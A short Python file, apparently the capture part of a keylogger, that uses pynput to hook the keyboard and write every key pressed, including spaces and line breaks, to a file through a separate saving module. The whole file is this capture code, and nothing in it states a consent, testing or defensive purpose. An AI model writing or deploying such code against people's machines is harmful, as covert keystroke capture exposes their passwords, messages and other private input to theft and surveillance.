import time
from pynput import keyboard
import Save_to_file


def key_press(key):
    if key == keyboard.Key.space:
        Save_to_file.save_to_file(" ")
    if key == keyboard.Key.enter:
        Save_to_file.save_to_file("\n")
    elif hasattr(key, 'char'):
        Save_to_file.save_to_file(key.char)


def hook_keyboard():
    with keyboard.Listener(on_press=key_press) as listener:
        listener.join()

